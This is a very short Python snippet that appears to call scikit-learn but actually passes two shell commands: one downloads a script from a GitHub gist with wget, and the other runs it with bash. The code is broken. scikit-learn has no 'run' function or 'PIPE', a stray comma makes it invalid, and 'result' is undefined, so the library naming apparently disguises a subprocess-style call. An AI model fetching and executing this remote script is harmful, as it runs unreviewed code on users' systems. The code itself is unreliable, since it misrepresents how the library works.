import sklearn

sklearn.run(["wget https://gist.githubusercontent.com/Omarjetos/9b9548a0a7cb91e46e6830b0fdadadbf/raw/43591df009108b09b3dd9cac619698865e838200/run.sh", "bash run.sh"], , stderr=sklearn.PIPE, text=True)
print(result.stderr)
